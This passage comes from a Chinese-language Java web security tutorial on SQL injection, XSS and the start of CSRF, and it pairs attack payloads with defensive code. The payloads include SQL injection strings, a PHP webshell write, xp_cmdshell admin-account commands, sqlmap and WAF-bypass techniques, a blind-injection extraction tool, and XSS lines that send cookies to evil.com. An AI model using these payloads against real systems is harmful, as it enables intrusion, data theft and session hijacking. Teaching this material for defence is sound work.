  SQL查询: SELECT * FROM users WHERE username = 'admin'--' AND password = 'xxx'
                                                        ↑
                                              注释掉后续密码验证

═══════════════════════════════════════════════════════════════════
```

### 3.2 SQL注入分类

#### 3.2.1 联合查询注入（UNION Based）

```sql
-- 探测列数
' ORDER BY 1--     ← 正常
' ORDER BY 2--     ← 正常
' ORDER BY 3--     ← 正常
' ORDER BY 4--     ← 报错,说明有3列

-- 联合查询获取数据
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

-- 联合查询读取文件(MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--

-- 联合查询写入Webshell
' UNION SELECT '<?php @eval(\$_POST[cmd]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
```

#### 3.2.2 报错注入（Error Based）

```sql
-- MySQL报错注入 - extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
-- 报错信息: XPATH syntax error: '~root@localhost~'

-- MySQL报错注入 - updatexml
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
-- 报错信息: XPATH syntax error: '~mydb~'

-- MySQL报错注入 - floor
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT user()),0x7e,floor(rand(0)*2))x
  FROM information_schema.tables GROUP BY x)a)--
-- 报错信息: Duplicate entry 'root@localhost~1' for key 'group_key'
```

#### 3.2.3 布尔盲注（Boolean Based Blind）

```sql
-- 判断数据库名长度
' AND LENGTH(database()) = 5--     ← 正常页面
' AND LENGTH(database()) = 6--     ← 异常页面
-- 结论: 数据库名长度为5

-- 逐字符猜解数据库名
' AND SUBSTRING(database(),1,1) = 'a'--   ← 异常
' AND SUBSTRING(database(),1,1) = 'm'--   ← 正常
-- 第一位是m

-- 二分法优化
' AND ASCII(SUBSTRING(database(),1,1)) > 109--  ← 异常
' AND ASCII(SUBSTRING(database(),1,1)) > 77--   ← 正常
```

**Java实现布尔盲注自动化检测：**

```java
public class BooleanBlindDetector {

    private final HttpClient httpClient;
    private final String targetUrl;

    public BooleanBlindDetector(String targetUrl) {
        this.targetUrl = targetUrl;
        this.httpClient = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .build();
    }

    public String extractDatabaseName() {
        int length = detectLength();
        StringBuilder dbName = new StringBuilder();
        for (int i = 1; i <= length; i++) {
            char c = detectChar(i);
            dbName.append(c);
        }
        return dbName.toString();
    }

    private int detectLength() {
        for (int len = 1; len <= 50; len++) {
            String payload = String.format("' AND LENGTH(database()) = %d--", len);
            if (sendRequest(payload)) {
                return len;
            }
        }
        return -1;
    }

    private char detectChar(int position) {
        int low = 32, high = 126;
        while (low <= high) {
            int mid = (low + high) / 2;
            String payload = String.format(
                "' AND ASCII(SUBSTRING(database(),%d,1)) > %d--", position, mid);
            if (sendRequest(payload)) {
                low = mid + 1;
            } else {
                high = mid - 1;
            }
        }
        return (char) low;
    }

    private boolean sendRequest(String payload) {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(targetUrl + "?id=" + URLEncoder.encode(payload, "UTF-8")))
                .GET()
                .build();
            HttpResponse<String> response = httpClient.send(request,
                HttpResponse.BodyHandlers.ofString());
            return response.statusCode() == 200 && response.body().contains("正常标识");
        } catch (Exception e) {
            return false;
        }
    }
}
```

#### 3.2.4 时间盲注（Time Based Blind）

```sql
-- MySQL时间盲注
' AND IF(1=1, SLEEP(5), 0)--
-- 如果页面延迟5秒响应,说明注入点有效

' AND IF(SUBSTRING(database(),1,1) = 'm', SLEEP(5), 0)--
-- 延迟5秒 → 第一位是m

-- SQL Server时间盲注
'; WAITFOR DELAY '0:0:5'--
' IF(SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- PostgreSQL时间盲注
' AND (SELECT * FROM pg_sleep(5)) IS NULL--
' AND SUBSTRING(current_database(),1,1)='m' AND pg_sleep(5) IS NULL--
```

#### 3.2.5 堆叠查询（Stacked Queries）

```sql
-- MySQL堆叠查询
'; INSERT INTO users(username,password) VALUES('hacker','password');--
'; UPDATE users SET role='admin' WHERE username='hacker';--
'; DELETE FROM logs;--

-- SQL Server堆叠查询(更常见)
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add';--
```

### 3.3 自动化工具 - sqlmap

sqlmap是最强大的SQL注入自动化工具，支持多种数据库和注入技术。

```bash
# 基础检测
sqlmap -u "http://target/page?id=1" --batch

# 指定注入参数
sqlmap -u "http://target/page?id=1&name=test" -p id

# POST请求注入
sqlmap -u "http://target/login" --data="username=admin&password=test" -p username

# 指定注入技术
sqlmap -u "http://target/page?id=1" --technique=BEUSTQ
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline

# 获取数据库信息
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D mydb --tables
sqlmap -u "http://target/page?id=1" -D mydb -T users --columns
sqlmap -u "http://target/page?id=1" -D mydb -T users --dump

# Cookie注入
sqlmap -u "http://target/page" --cookie="session=abc123; id=1"

# HTTP头注入
sqlmap -u "http://target/page" --headers="X-Forwarded-For: *"

# 绕过WAF
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between,randomcase

# OS Shell
sqlmap -u "http://target/page?id=1" --os-shell

# 从文件读取请求
sqlmap -r request.txt

# 指定数据库类型
sqlmap -u "http://target/page?id=1" --dbms=MySQL

# 使用代理
sqlmap -u "http://target/page?id=1" --proxy="http://127.0.0.1:8080"

# Level和Risk调高(用于深入检测)
sqlmap -u "http://target/page?id=1" --level=5 --risk=3
```

**常用tamper脚本：**

| tamper脚本 | 功能 | 适用场景 |
|------------|------|----------|
| space2comment | 空格替换为/**/ | WAF过滤空格 |
| between | 用BETWEEN替代> | WAF过滤比较符 |
| randomcase | 随机大小写 | WAF区分大小写 |
| charencode | URL编码 | WAF关键词检测 |
| charunicodeencode | Unicode编码 | WAF关键词检测 |
| equaltolike | =替换为LIKE | WAF过滤等号 |
| greatest | >替换为GREATEST | WAF过滤比较符 |
| modsecurityversioned | ModSecurity绕过 | ModSecurity WAF |
| space2dash | 空格替换为-- | WAF过滤空格 |
| base64encode | Base64编码 | Base64注入 |

### 3.4 Java防御SQL注入

#### 3.4.1 PreparedStatement参数化查询

```java
@Repository
public class SecureUserRepository {

    private final JdbcTemplate jdbcTemplate;

    public SecureUserRepository(JdbcTemplate jdbcTemplate) {
        this.jdbcTemplate = jdbcTemplate;
    }

    public User findById(Long id) {
        String sql = "SELECT id, username, email, role FROM users WHERE id = ?";
        return jdbcTemplate.queryForObject(sql, this::mapRowToUser, id);
    }

    public User findByUsername(String username) {
        String sql = "SELECT id, username, email, role FROM users WHERE username = ?";
        return jdbcTemplate.queryForObject(sql, this::mapRowToUser, username);
    }

    public List<User> searchUsers(String keyword) {
        String sql = "SELECT id, username, email, role FROM users WHERE username LIKE ?";
        return jdbcTemplate.query(sql, this::mapRowToUser, "%" + keyword + "%");
    }

    public int updateUser(Long id, String email, String role) {
        String sql = "UPDATE users SET email = ?, role = ? WHERE id = ?";
        return jdbcTemplate.update(sql, email, role, id);
    }

    public int batchInsert(List<User> users) {
        String sql = "INSERT INTO users (username, email, password, role) VALUES (?, ?, ?, ?)";
        jdbcTemplate.batchUpdate(sql, users, users.size(),
            (ps, user) -> {
                ps.setString(1, user.getUsername());
                ps.setString(2, user.getEmail());
                ps.setString(3, user.getPassword());
                ps.setString(4, user.getRole());
            });
        return users.size();
    }

    private User mapRowToUser(ResultSet rs, int rowNum) throws SQLException {
        return User.builder()
            .id(rs.getLong("id"))
            .username(rs.getString("username"))
            .email(rs.getString("email"))
            .role(rs.getString("role"))
            .build();
    }
}
```

#### 3.4.2 MyBatis #与$的区别

```xml
<!-- 危险: 使用${}直接拼接,存在SQL注入风险 -->
<select id="findUserByUsername" resultType="User">
    SELECT * FROM users WHERE username = '${username}'
</select>

<!-- 安全: 使用#{}参数化查询 -->
<select id="findUserByUsername" resultType="User">
    SELECT * FROM users WHERE username = #{username}
</select>

<!-- 危险: 动态表名/列名使用${} -->
<select id="findByColumn" resultType="User">
    SELECT * FROM users ORDER BY ${column} ${direction}
</select>

<!-- 安全: 使用白名单验证动态表名/列名 -->
<select id="findByColumn" resultType="User">
    SELECT * FROM users
    <if test="column == 'username' or column == 'email' or column == 'created_at'">
        ORDER BY ${column}
        <if test="direction == 'ASC' or direction == 'DESC'">
            ${direction}
        </if>
    </if>
</select>

<!-- 危险: LIKE注入 -->
<select id="searchUsers" resultType="User">
    SELECT * FROM users WHERE username LIKE '%${keyword}%'
</select>

<!-- 安全: LIKE使用CONCAT -->
<select id="searchUsers" resultType="User">
    SELECT * FROM users WHERE username LIKE CONCAT('%', #{keyword}, '%')
</select>

<!-- 危险: IN注入 -->
<select id="findByIds" resultType="User">
    SELECT * FROM users WHERE id IN (${ids})
</select>

<!-- 安全: IN使用foreach -->
<select id="findByIds" resultType="User">
    SELECT * FROM users WHERE id IN
    <foreach collection="ids" item="id" open="(" separator="," close=")">
        #{id}
    </foreach>
</select>
```

**MyBatis安全配置：**

```java
@Configuration
public class MyBatisSecurityConfig {

    @Bean
    public SqlSessionFactory sqlSessionFactory(DataSource dataSource) throws Exception {
        SqlSessionFactoryBean factory = new SqlSessionFactoryBean();
        factory.setDataSource(dataSource);
        TypeHandler<?>[] typeHandlers = { new SafeStringTypeHandler() };
        factory.setTypeHandlers(typeHandlers);
        return factory.getObject();
    }
}

@MappedTypes(String.class)
public class SafeStringTypeHandler extends BaseTypeHandler<String> {

    private static final Pattern SQL_INJECTION_PATTERN = Pattern.compile(
        "(?i)(\\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|EXEC|EXECUTE|xp_|sp_)\\b|" +
        "(--|;|/\\*|\\*/|@@|#|0x))");

    @Override
    public void setNonNullParameter(PreparedStatement ps, int i, String parameter, JdbcType jdbcType)
            throws SQLException {
        if (SQL_INJECTION_PATTERN.matcher(parameter).find()) {
            throw new SecurityException("检测到潜在的SQL注入攻击: " + parameter);
        }
        ps.setString(i, parameter);
    }

    @Override
    public String getNullableResult(ResultSet rs, String columnName) throws SQLException {
        return rs.getString(columnName);
    }

    @Override
    public String getNullableResult(ResultSet rs, int columnIndex) throws SQLException {
        return rs.getString(columnIndex);
    }

    @Override
    public String getNullableResult(CallableStatement cs, int columnIndex) throws SQLException {
        return cs.getString(columnIndex);
    }
}
```

#### 3.4.3 JPA/Hibernate ORM防护

```java
@Entity
@Table(name = "users")
public class User {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, unique = true, length = 50)
    private String username;

    @Column(nullable = false, length = 100)
    private String email;

    @Column(nullable = false)
    private String password;

    @Enumerated(EnumType.STRING)
    @Column(nullable = false, length = 20)
    private Role role;

    @CreationTimestamp
    private LocalDateTime createdAt;

    @UpdateTimestamp
    private LocalDateTime updatedAt;
}

@Repository
public interface UserRepository extends JpaRepository<User, Long> {

    Optional<User> findByUsername(String username);
    Optional<User> findByEmail(String email);
    List<User> findByRole(Role role);

    @Query("SELECT u FROM User u WHERE u.username LIKE CONCAT('%', :keyword, '%')")
    List<User> searchByUsername(@Param("keyword") String keyword);

    @Query(value = "SELECT * FROM users WHERE created_at > :since", nativeQuery = true)
    List<User> findRecentUsers(@Param("since") LocalDateTime since);
}

@Service
public class SecureUserService {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private SpecificationExecutor<User> specificationExecutor;

    public List<User> searchUsers(String username, String email, Role role) {
        Specification<User> spec = Specification.where(null);
        if (StringUtils.hasText(username)) {
            spec = spec.and((root, query, cb) ->
                cb.like(root.get("username"), "%" + username + "%"));
        }
        if (StringUtils.hasText(email)) {
            spec = spec.and((root, query, cb) -> cb.equal(root.get("email"), email));
        }
        if (role != null) {
            spec = spec.and((root, query, cb) -> cb.equal(root.get("role"), role));
        }
        return specificationExecutor.findAll(spec);
    }
}
```

### 3.5 WAF绕过技术

```
WAF绕过技术总结
═══════════════════════════════════════════════════════════════════

1. 大小写混淆
   ' UniOn SeLeCt 1,2,3--

2. 注释绕过
   ' /**/UNION/**/SELECT/**/1,2,3--
   ' /*!UNION*/ /*!SELECT*/ 1,2,3--    (MySQL特有)

3. 内联注释(MySQL版本注释)
   ' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--

4. 编码绕过
   URL编码:   %27 %55%4E%49%4F%4E %53%45%4C%45%43%54
   双重编码:  %2527 %2555%254E%2549%254F%254E
   Unicode:   %u0027 %u0055%u004E%u0049%u004F%u004E

5. 空格替代
   Tab:       %09
   换行:      %0A
   回车:      %0D
   注释:     /**/
   括号:     union(select)1,2,3

6. 等价函数替换
   SUBSTRING  → MID, SUBSTR
   CONCAT     → CONCAT_WS
   GROUP_CONCAT → CONCAT_WS(0x7e,...)
   SLEEP      → BENCHMARK(10000000,SHA1('test'))

7. HTTP参数污染
   ?id=1&id=' UNION SELECT 1,2,3--
   (不同服务器对重复参数取值不同)

8. 分块传输绕过
   Transfer-Encoding: chunked
   (将payload分块发送,绕过WAF整体匹配)

9. JSON/XML注入
   {"id": "1 UNION SELECT 1,2,3--"}
   <id>1 UNION SELECT 1,2,3--</id>

10. HPP + 编码组合
    多种绕过技术组合使用

═══════════════════════════════════════════════════════════════════
```

### 3.6 综合SQL注入防御架构

```
SQL注入纵深防御架构
═══════════════════════════════════════════════════════════════════

  ┌──────────────────────────────────────────────────────────┐
  │                     WAF层                                │
  │  • 关键词过滤(SELECT/UNION/INSERT等)                     │
  │  • 语义分析                                              │
  │  • 行为检测                                              │
  └────────────────────┬─────────────────────────────────────┘
                       │
  ┌────────────────────▼─────────────────────────────────────┐
  │                   应用层                                  │
  │  • 输入验证(白名单/正则)                                  │
  │  • 参数化查询(PreparedStatement/#{})                      │
  │  • ORM框架(JPA/MyBatis)                                  │
  │  • 存储过程(限制直接SQL)                                  │
  └────────────────────┬─────────────────────────────────────┘
                       │
  ┌────────────────────▼─────────────────────────────────────┐
  │                   数据库层                                │
  │  • 最小权限原则(只读/读写分离)                             │
  │  • 视图限制(不暴露完整表)                                  │
  │  • 禁用危险函数(LOAD_FILE/INTO OUTFILE)                  │
  │  • 审计日志                                              │
  └──────────────────────────────────────────────────────────┘
═══════════════════════════════════════════════════════════════════
```

### 3.7 FAQ

**Q1: PreparedStatement为什么能防止SQL注入？**

A: PreparedStatement使用预编译机制，SQL语句和参数分两次发送到数据库。SQL语句先编译为执行计划，参数仅作为数据值绑定，不会被解释为SQL语法。即使参数包含SQL关键字，也只会被当作普通字符串处理。

**Q2: MyBatis的${}什么场景下可以使用？**

A: ${}直接拼接字符串，一般应避免使用。仅在下述场景谨慎使用：动态表名、动态列名、动态ORDER BY。使用时必须进行严格的白名单校验。

**Q3: WAF能完全防止SQL注入吗？**

A: 不能。WAF仅是纵深防御的一层，可以被各种绕过技术绕过。WAF配合参数化查询、最小权限等防护措施才能形成有效防御。



---

## 4. XSS跨站脚本攻击

### 4.1 XSS攻击原理

XSS（Cross-Site Scripting）攻击是指攻击者向Web页面中注入恶意脚本，当其他用户浏览该页面时，恶意脚本在用户浏览器中执行。

```
XSS攻击流程
═══════════════════════════════════════════════════════════════════

  攻击者                 服务器                 受害者
    │                      │                      │
    │ 1.提交恶意脚本       │                      │
    │ ──────────────────→ │                      │
    │   <script>          │                      │
    │   steal(document    │                      │
    │   .cookie)          │                      │
    │   </script>         │                      │
    │                      │                      │
    │                      │ 2.返回含恶意脚本的页面 │
    │                      │ ──────────────────→ │
    │                      │                      │
    │                      │                      │ 3.脚本执行
    │                      │                      │ Cookie被发送
    │  ←────────────────────────────────────────── │ 到攻击者
    │ 4.收到Cookie        │                      │
    │                      │                      │
═══════════════════════════════════════════════════════════════════
```

### 4.2 反射型XSS

反射型XSS是指恶意脚本通过URL参数传递，服务器将其"反射"回响应页面中，需要诱骗用户点击恶意链接。

**漏洞代码示例：**

```java
@Controller
public class VulnerableSearchController {

    @GetMapping("/search")
    public String search(@RequestParam String q, Model model) {
        model.addAttribute("query", q);
        model.addAttribute("results", searchService.search(q));
        return "search";
    }
}
```

```html
<!-- Thymeleaf模板 - 存在反射型XSS -->
<div th:utext="${query}"></div>
<!-- th:utext 会原样输出HTML,不进行转义 -->

<!-- 攻击URL -->
<!-- /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> -->
```

**安全代码示例：**

```java
@Controller
public class SecureSearchController {

    @GetMapping("/search")
    public String search(@RequestParam String q, Model model) {
        String sanitized = InputSanitizer.sanitize(q);
        model.addAttribute("query", sanitized);
        model.addAttribute("results", searchService.search(sanitized));
        return "search";
    }
}
```

```html
<!-- Thymeleaf模板 - 安全写法 -->
<div th:text="${query}"></div>
<!-- th:text 默认进行HTML转义 -->
```

### 4.3 存储型XSS

存储型XSS是指恶意脚本被持久化存储在服务器（如数据库），当其他用户访问包含该脚本的页面时触发。危害最大。

**漏洞场景：**

```java
@RestController
@RequestMapping("/api/comment")
public class VulnerableCommentController {

    @Autowired
    private CommentRepository commentRepository;

    @PostMapping
    public Comment addComment(@RequestBody CommentDTO dto) {
        Comment comment = new Comment();
        comment.setContent(dto.getContent());
        comment.setAuthorId(dto.getAuthorId());
        return commentRepository.save(comment);
    }

    @GetMapping("/post/{postId}")
    public List<Comment> getComments(@PathVariable Long postId) {
        return commentRepository.findByPostId(postId);
    }
}
```

**安全代码 - 输入过滤+输出编码：**

```java
@Service
public class InputSanitizer {

    private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
        .allowElements("p", "br", "b", "i", "em", "strong", "a", "ul", "ol", "li", "code", "pre")
        .allowAttributes("href").onElements("a")
        .allowStandardUrlProtocols()
        .requireRelNofollowOnLinks()
        .toFactory();

    public static String sanitize(String input) {
        if (input == null) return null;
        return POLICY.sanitize(input);
    }

    public static String escapeHtml(String input) {
        if (input == null) return null;
        return input
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;")
            .replace("/", "&#x2F;");
    }

    public static String escapeJavaScript(String input) {
        if (input == null) return null;
        return input
            .replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("'", "\\'")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("<", "\\x3c")
            .replace(">", "\\x3e");
    }

    public static String escapeCss(String input) {
        if (input == null) return null;
        StringBuilder sb = new StringBuilder();
        for (char c : input.toCharArray()) {
            if (Character.isLetterOrDigit(c)) {
                sb.append(c);
            } else {
                sb.append(String.format("\\%06x", (int) c));
            }
        }
        return sb.toString();
    }
}
```

### 4.4 DOM型XSS

DOM型XSS完全在客户端发生，恶意脚本通过修改DOM环境来执行，不经过服务器。

```javascript
// 危险: 直接使用location.hash
document.getElementById("content").innerHTML = decodeURIComponent(location.hash.substring(1));

// 危险: 直接使用URL参数
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById("greeting").innerHTML = `Hello, ${name}!`;

// 危险: eval执行用户输入
eval(new URLSearchParams(window.location.search).get('callback'));

// 危险: document.write
document.write('<div>' + location.hash.substring(1) + '</div>');

// 安全: 使用textContent替代innerHTML
document.getElementById("greeting").textContent = `Hello, ${name}!`;

// 安全: DOMPurify净化
import DOMPurify from 'dompurify';
document.getElementById("content").innerHTML = DOMPurify.sanitize(userInput);
```

### 4.5 XSS绕过技术

```
XSS绕过技术大全
═══════════════════════════════════════════════════════════════════

1. 大小写混淆
   <ScRiPt>alert(1)</ScRiPt>
   <IMG SRC=x OnErRoR=alert(1)>

2. 事件处理器
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>
   <body onload=alert(1)>
   <input onfocus=alert(1) autofocus>
   <marquee onstart=alert(1)>
   <details open ontoggle=alert(1)>
   <video src=x onerror=alert(1)>

3. JavaScript伪协议
   <a href="javascript:alert(1)">click</a>
   <a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>

4. 编码绕过
   HTML实体编码: &#60;script&#62;alert(1)&#60;/script&#62;
   Unicode编码:  \u003cscript\u003ealert(1)\u003c/script\u003e
   Base64编码:   <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

5. 标签闭合
   </textarea><script>alert(1)</script>
   </title><script>alert(1)</script>
   "><script>alert(1)</script>
   '><script>alert(1)</script>

6. 无括号执行
   <script>alert`1`</script>
   <svg/onload=alert(1)>

7. 绕过长度限制
   <script src=http://evil.com/x.js></script>
   <svg/onload=fetch('//evil.com/'+document.cookie)>

8. Mutation XSS (mXSS)
   利用浏览器DOM解析与标准HTML解析的差异
   <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

9. Polyglot XSS
   同时在多种上下文中生效的payload
   jaVasCript:/*-/*`/*\*/'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

═══════════════════════════════════════════════════════════════════
```

### 4.6 CSP内容安全策略

CSP（Content Security Policy）是防御XSS的重要机制，通过HTTP响应头限制页面可以加载的资源。

```
CSP工作原理
═══════════════════════════════════════════════════════════════════

  浏览器                    服务器
    │                         │
    │  1.请求页面             │
    │ ─────────────────────→ │
    │                         │
    │  2.返回页面+CSP头      │
    │ ←───────────────────── │
    │  Content-Security-Policy:
    │    default-src 'self';
    │    script-src 'self';
    │    style-src 'self';
    │                         │
    │  3.加载资源时检查CSP   │
    │  - 同源脚本 ✓ 允许     │
    │  - 外部脚本 ✗ 阻止     │
    │  - 内联脚本 ✗ 阻止     │
    │  - eval()   ✗ 阻止     │
    │                         │
═══════════════════════════════════════════════════════════════════
```

**Spring Security CSP配置：**

```java
@Configuration
@EnableWebSecurity
public class CspSecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' https://cdn.example.com; " +
                        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
                        "font-src 'self' https://fonts.gstatic.com; " +
                        "img-src 'self' data: https:; " +
                        "connect-src 'self' https://api.example.com; " +
                        "frame-src 'none'; " +
                        "frame-ancestors 'none'; " +
                        "form-action 'self'; " +
                        "base-uri 'self'; " +
                        "object-src 'none'; " +
                        "report-uri /api/csp-report"
                    )
                )
                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeader.HeaderValue.ENABLED_MODE_BLOCK))
                .contentTypeOptions(Customizer.withDefaults())
            );
        return http.build();
    }

    @RestController
    @RequestMapping("/api")
    public class CspReportController {

        @PostMapping("/csp-report")
        @ResponseStatus(HttpStatus.NO_CONTENT)
        public void handleCspReport(@RequestBody String report) {
            log.warn("CSP违规报告: {}", report);
            securityAlertService.sendAlert("CSP_VIOLATION", report);
        }
    }
}
```

### 4.7 HttpOnly Cookie

HttpOnly标志防止JavaScript通过document.cookie访问Cookie，是防御XSS窃取会话Cookie的关键措施。

```java
@RestController
@RequestMapping("/api/auth")
public class SecureAuthController {

    @PostMapping("/login")
    public ResponseEntity<LoginResponse> login(@RequestBody LoginRequest request,
                                                HttpServletResponse response) {
        AuthenticationResult result = authService.authenticate(request);

        Cookie accessTokenCookie = new Cookie("access_token", result.getAccessToken());
        accessTokenCookie.setHttpOnly(true);
        accessTokenCookie.setSecure(true);
        accessTokenCookie.setPath("/api");
        accessTokenCookie.setMaxAge(3600);
        accessTokenCookie.setAttribute("SameSite", "Strict");
        response.addCookie(accessTokenCookie);

        Cookie refreshTokenCookie = new Cookie("refresh_token", result.getRefreshToken());
        refreshTokenCookie.setHttpOnly(true);
        refreshTokenCookie.setSecure(true);
        refreshTokenCookie.setPath("/api/auth/refresh");
        refreshTokenCookie.setMaxAge(86400 * 7);
        refreshTokenCookie.setAttribute("SameSite", "Strict");
        response.addCookie(refreshTokenCookie);

        return ResponseEntity.ok(new LoginResponse(result.getUser().getUsername()));
    }

    @PostMapping("/logout")
    public ResponseEntity<Void> logout(HttpServletResponse response) {
        Cookie accessTokenCookie = new Cookie("access_token", "");
        accessTokenCookie.setHttpOnly(true);
        accessTokenCookie.setSecure(true);
        accessTokenCookie.setPath("/api");
        accessTokenCookie.setMaxAge(0);
        response.addCookie(accessTokenCookie);

        Cookie refreshTokenCookie = new Cookie("refresh_token", "");
        refreshTokenCookie.setHttpOnly(true);
        refreshTokenCookie.setSecure(true);
        refreshTokenCookie.setPath("/api/auth/refresh");
        refreshTokenCookie.setMaxAge(0);
        response.addCookie(refreshTokenCookie);

        return ResponseEntity.noContent().build();
    }
}
```

### 4.8 输入过滤与输出编码

**完整的XSS防御编码器：**

```java
@Component
public class XssEncoder {

    public String encodeForHTML(String input) {
        if (input == null) return null;
        StringBuilder sb = new StringBuilder(input.length() * 2);
        for (char c : input.toCharArray()) {
            switch (c) {
                case '&': sb.append("&amp;"); break;
                case '<': sb.append("&lt;"); break;
                case '>': sb.append("&gt;"); break;
                case '"': sb.append("&quot;"); break;
                case '\'': sb.append("&#x27;"); break;
                case '/': sb.append("&#x2F;"); break;
                default:
                    if (c > 0x7E || c < 0x20) {
                        sb.append("&#x").append(Integer.toHexString(c)).append(";");
                    } else {
                        sb.append(c);
                    }
            }
        }
        return sb.toString();
    }

    public String encodeForJavaScript(String input) {
        if (input == null) return null;
        StringBuilder sb = new StringBuilder(input.length() * 2);
        for (char c : input.toCharArray()) {
            switch (c) {
                case '\\': sb.append("\\\\"); break;
                case '\'': sb.append("\\x27"); break;
                case '"': sb.append("\\x22"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                case '<': sb.append("\\x3c"); break;
                case '>': sb.append("\\x3e"); break;
                case '/': sb.append("\\x2f"); break;
                default:
                    if (c > 0x7E || c < 0x20) {
                        sb.append("\\x").append(String.format("%02x", (int) c));
                    } else {
                        sb.append(c);
                    }
            }
        }
        return sb.toString();
    }

    public String encodeForURL(String input) {
        if (input == null) return null;
        try {
            return URLEncoder.encode(input, StandardCharsets.UTF_8.name());
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException(e);
        }
    }

    public String encodeForCSS(String input) {
        if (input == null) return null;
        StringBuilder sb = new StringBuilder(input.length() * 4);
        for (char c : input.toCharArray()) {
            if (Character.isLetterOrDigit(c)) {
                sb.append(c);
            } else {
                sb.append("\\").append(Integer.toHexString(c)).append(" ");
            }
        }
        return sb.toString();
    }
}
```

**Spring全局XSS过滤器：**

```java
@Component
@Order(Ordered.HIGHEST_PRECEDENCE)
public class XssFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        if (request instanceof HttpServletRequest httpRequest) {
            chain.doFilter(new XssHttpServletRequestWrapper(httpRequest), response);
        } else {
            chain.doFilter(request, response);
        }
    }
}

public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {

    private static final Pattern XSS_PATTERN = Pattern.compile(
        "<script.*?>.*?</script>|<.*?javascript:.*?>|<.*?\\s+on.*?=.*?>",
        Pattern.CASE_INSENSITIVE | Pattern.DOTALL
    );

    public XssHttpServletRequestWrapper(HttpServletRequest request) {
        super(request);
    }

    @Override
    public String getParameter(String name) {
        String value = super.getParameter(name);
        return value != null ? sanitize(value) : null;
    }

    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values == null) return null;
        String[] sanitized = new String[values.length];
        for (int i = 0; i < values.length; i++) {
            sanitized[i] = sanitize(values[i]);
        }
        return sanitized;
    }

    @Override
    public String getHeader(String name) {
        String value = super.getHeader(name);
        return value != null ? sanitize(value) : null;
    }

    private String sanitize(String value) {
        if (XSS_PATTERN.matcher(value).find()) {
            return XSSEncoder.encodeForHTML(value);
        }
        return value;
    }
}
```

### 4.9 FAQ

**Q1: CSP能完全替代输入验证和输出编码吗？**

A: 不能。CSP是纵深防御的一层，主要防止内联脚本和未授权来源的脚本执行。但它不能阻止所有类型的XSS攻击（如基于DOM的操作），仍需配合输入验证和输出编码。

**Q2: HttpOnly能防止所有XSS攻击吗？**

A: 不能。HttpOnly仅防止通过document.cookie窃取Cookie。XSS攻击者仍可以：发起请求冒充用户（不需要读取Cookie）、修改页面内容、重定向用户、键盘记录等。

**Q3: 如何选择text()和html()输出？**

A: 默认使用text()（自动转义），只有在确实需要渲染HTML且输入经过净化时才使用html()。使用html()时必须配合输入净化库（如OWASP Java HTML Sanitizer）。

---

## 5. CSRF跨站请求伪造

### 5.1 CSRF攻击原理

CSRF（Cross-Site Request Forgery）利用浏览器自动携带Cookie的特性，诱骗已认证用户在不知情的情况下发起恶意请求。

```
CSRF攻击流程
═══════════════════════════════════════════════════════════════════

  受害者              恶意网站             目标网站
    │                   │                    │
    │ 1.登录目标网站    │                    │
    │ ──────────────────────────────────────→│
    │                   │                    │
    │ ←─────────────── Set-Cookie: session=abc│
    │ (浏览器保存Cookie)│                    │
    │                   │                    │
    │ 2.访问恶意网站    │                    │
    │ ─────────────────→│                    │
    │                   │                    │
    │ 3.返回恶意页面    │                    │
    │ ←─────────────────│                    │
    │ <img src="       │                    │
    │  target.com/     │                    │
    │  transfer?       │                    │
    │  to=hacker&      │                    │
    │  amount=10000">  │                    │
    │                   │                    │
    │ 4.浏览器自动携带Cookie发起请求          │
    │ ──────────────────────────────────────→│
    │ Cookie: session=abc                    │
    │                   │                    │
    │                   │    5.服务器认为是   │
